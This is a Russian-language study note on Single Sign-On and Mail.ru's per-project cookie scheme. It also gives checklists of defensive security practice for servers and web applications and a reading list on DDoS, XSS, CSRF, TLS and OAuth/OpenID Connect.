Single Sign On — это технология, с помощью которой пользователь, будучи аутентифицированным на одном ресурсе компании,
будет аутентифицирован и на остальных. Для этого выделяется некоторый Identity Provider (IdP), к которому
перенаправляются все неавторизованные запросы. IdP хранит некоторый ticket в cookies пользователя, по которому
выполняется проверка авторизации. Если авторизация прошла успешно, то пользователь перенаправляется обратно на сервис с
токеном, который сервис сохраняет в сессию.

![Identity Provider](images/identity_provider.png)

Авторизация активного клиента (клиент сам делает запрос к identity provider). Браузер же — пассивный клиент в том
смысле, что он только может отображать страницы, запрошенные пользователем. В этом случае аутентификация достигается
посредством автоматического перенаправления браузера между веб-приложениями identity provider и service provider.

![SSO auth flow](images/sso_auth_flow.png)

По шагам:

1. Пользователь открывает веб-приложение.
1. Если у пользователя нет сессии, приложение перенаправляет его на IdP.
1. Пользователь вводит логин/пароль. Они отправляются на IdP где он проводит валидацию.
1. В случае успешной авторизации IdP генерирует token для пользователя.
1. Запрос перенаправляется на приложение, token передается как параметр.
1. Наше веб-приложение проверяет token у IdP.
1. Если token корректный, пользователю отдается ответ.

Если token общий для всех систем, то его потеря даст доступ ко всему. Чтобы предотвратить это, используются специфичные
для сервиса token’ы. У mail.ru хорошо описано работа с подожженными cookie.

![SSO Mail.ru](images/sso_mail.ru.png)

Для обеспечения общей авторизации вводятся дополнительные доменные cookie, необходимые для усиления безопасности
использования конкретного проекта. Помимо основной авторизационной cookie (MPOP), в проектном домене выставляется
дополнительная cookie (SDC). Авторизация на этом проекте будет валидна только при наличии обеих cookie — MPOP и
внутридоменной SDC-cookie.

Аутентификация пользователя всегда происходит через единый центр авторизации, `auth.mail.ru`, который получает логин и
пароль и выдает доменную cookie `.auth.mail.ru` с флагами `Secure` и `HTTPOnly`. Ни один из проектов не имеет доступа к
логину и пароля пользователя. Cookie `.auth.mail.ru` также недоступна ни одному из проектов.

Когда пользователь заходит на сайт проекта, для которого у него еще нет авторизации, его запрос перенаправляется в центр
авторизации. Центр авторизации аутентифицирует его по наличию cookie `.auth.mail.ru`, генерирует одноразовый токен и
перенаправляет на страницу проекта. Токен проксируется проектом в центр авторизации, который по нему генерирует уже
проектную cookie для `.project.mail.ru`. Таким образом, сохраняются все преимущества единой портальной авторизации, но
прозрачно для пользователя разделяется авторизация доступа к различным ресурсам.

## Практика безопасности

### Для серверов

* Ограничения по iptables (есть мнение, что ограничивать стоит только внешние подключения, т.к. если злоумышленник уже
  внутри, то у него есть возможность отключить iptables совсем).
* Для выполнения программ создавать специальных пользователей с ограниченным набором прав. В /etc/sudoers можно задавать
  список команд, на которые доступно повышение привилегий.
* Отключить подключение по ssh от root. Логин от root возможен только с целевой машины. Можно указать вообще диапозон
  адресов с которых разрешен доступ на машину в /ets/hosts.allow и /etc/hosts.deny.
* Пароли хранить в хэшированном виде, возможно с применением salt.
* Между сервисами создавать отдельные сетевые интерфейсы и взаимодействия через туннели.
* Хорошей практикой является запуск программ в контейнерах, т.к. в случае доступа к ней, злоумышленник получает доступ
  лишь до ограниченного пространства, а не до всей host-машины.
* Парольные для важных сервисов использовать парольные политики.
* Использовать подпись запросов.

### Для веб-приложений

* Аутентификации по паролям считается не очень надежным способом, так как пароли часто можно подобрать, а пользователи
  склонны использовать простые и одинаковые пароли в разных системах, либо записывать их на клочках бумаги. Если
  злоумышленник смог выяснить пароль, то пользователь зачастую об этом не узнает.
* Токены доступа должны иметь время жизни. В идеале должен быть какой-то механизм для отзыва компрометирующих токенов.
* Запретить пользователям создавать простые пароли.
* Всегда использовать HTTPS и HSTS.
* Предусмотреть защиту от перебора (brute-force attack).
* Не передавать пароли в строке URL, т.к. Они могут быть видны в access-логах промежуточных прокси-серверов.
* В случае изменения пароля извещать пользователя.
* Не использовать уязвимую или предсказуемую ссылку для сброса пароля.
* Для предотвращения CSRF использовать state.
* Всегда делать проверку входных данных на клиенте / сервере. Если в поле может быть передана строка, то экранировать ее
  для предотвращения SQL-инъекций.
* Заводить пользователей для работы с БД с ограниченным набором прав.
* При действиях с данными пользователя (изменение пароля, адреса доставки и т.п.) перезапрашивать пароль пользователя.
* Не использовать tokens таким образом, чтобы они могли быть подобраны или предсказаны для других пользователей.
* Всегда проверять что действие доступно для пользователя (что оперируемая сущность ему принадлежит и он имеет права ее
  менять).
* Для важных данных в Cookies использовать флаги Secure и HttpOnly.
* Уничтожать сессии пользователя после периода неактивности.

## Литература

1. [Защита сервера от DDoS-атак](https://itelon.ru/blog/zashchita-servera-ot-ddos-atak/)
1. [What is a Ping (ICMP) flood attack?](https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/)
1. [What is a SYN flood attack?](https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/)
1. [What is a NTP amplification attack?](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/)
1. [Xss для новичков](https://forum.antichat.ru/threads/20140/)
1. [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
1. [Атака CSRF](https://learn.javascript.ru/csrf)
1. [Как HTTPS обеспечивает безопасность соединения: что должен знать каждый Web-разработчик](https://habr.com/ru/post/188042/)
1. [Что такое протокол HTTPS, и как он защищает вас в интернете](https://yandex.ru/blog/company/77455)
1. [The First Few Milliseconds of an HTTPS Connection](http://www.moserware.com/2009/06/first-few-milliseconds-of-https.html)
1. [Введение в TLS для Патриков (часть 1)](https://habr.com/ru/company/plesk/blog/502604/)
1. [Протокол Диффи — Хеллмана](https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB_%D0%94%D0%B8%D1%84%D1%84%D0%B8_%E2%80%94_%D0%A5%D0%B5%D0%BB%D0%BB%D0%BC%D0%B0%D0%BD%D0%B0)
1. [OAuth 2.0 простым и понятным языком](https://habr.com/ru/company/mailru/blog/115163/)
1. [Введение в OAuth 2](https://www.digitalocean.com/community/tutorials/oauth-2-ru)
1. [A Guide To OAuth 2.0 Grants](https://alexbilbie.com/guide-to-oauth-2-grants/)
1. [Разделяй и властвуй: как мы реализовывали разделение сессий на портале Mail.Ru](https://habr.com/ru/company/mailru/blog/228997/)
1. [Технические аспекты блокировки интернета в России. Проблемы и перспективы](https://www.youtube.com/watch?v=25GC76M0BHQ)
1. [OWASP Top Ten Security Risks](https://owasp.org/www-project-top-ten/)
1. [OverTheWire: Natas](https://overthewire.org/wargames/natas/)
1. [Computer Security Student](https://computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB)
1. [Иллюстрированное руководство по OAuth и OpenID Connect](https://habr.com/ru/company/flant/blog/475942/)
1. [OpenID Connect 1.0 На Пальцах](https://habr.com/ru/post/422765/)
1. [Платформа удостоверений Майкрософт и протокол OpenID Connect](https://docs.microsoft.com/ru-ru/azure/active-directory/develop/v2-protocols-oidc)